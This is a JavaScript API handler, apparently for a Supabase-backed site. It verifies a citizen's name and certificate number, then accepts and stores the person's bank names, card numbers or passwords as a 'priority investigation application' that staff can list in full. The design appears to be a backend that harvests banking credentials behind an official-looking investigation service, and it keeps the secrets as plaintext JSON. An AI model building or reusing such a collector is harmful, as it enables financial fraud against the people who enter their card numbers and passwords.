const { getJsonBody, getSupabase, json, loadSupabasePriorityApplications, methodNotAllowed, normalizeCertificateNumber, priorityEntriesFromInput, publicPriorityApplication, requireStaff, serviceErrorMessage } = require('../_lib/service');

async function matchingIdentity(client, body) {
  const citizenName = String(body.citizenName || '').trim();
  const certificateNumber = normalizeCertificateNumber(body.certificateNumber);
  if (!citizenName || !certificateNumber) return { error: '請輸入姓名與證號', status: 400 };
  const cases = await client.from('service_cases').select('id').eq('citizen_name', citizenName).eq('certificate_number', certificateNumber).limit(1);
  if (cases.error) throw cases.error;
  if (!(cases.data || []).length) return { error: '查無資料', status: 404 };
  return { citizenName, certificateNumber };
}

async function handler(req, res) {
  if (!['GET', 'POST'].includes(req.method)) return methodNotAllowed(res, ['GET', 'POST']);
  try {
    const client = getSupabase();
    if (req.method === 'GET') {
      const session = requireStaff(req, res);
      if (!session) return;
      return json(res, 200, { applications: await loadSupabasePriorityApplications(client) });
    }

    const body = await getJsonBody(req);
    const identity = await matchingIdentity(client, body);
    if (identity.error) return json(res, identity.status, { error: identity.error });
    const entries = priorityEntriesFromInput(body.entries);
    if (!entries.length) return json(res, 400, { error: '請至少填寫一筆銀行、卡號或密碼' });
    const inserted = await client.from('priority_applications').insert({
      citizen_name: identity.citizenName,
      certificate_number: identity.certificateNumber,
      entries_json: JSON.stringify(entries)
    }).select('*').single();
    if (inserted.error) throw inserted.error;
    json(res, 200, { application: publicPriorityApplication(inserted.data) });
  } catch (error) {
    json(res, 500, { error: serviceErrorMessage(error, '優先調查申請處理失敗') });
  }
}

module.exports = handler;
module.exports.matchingIdentity = matchingIdentity;
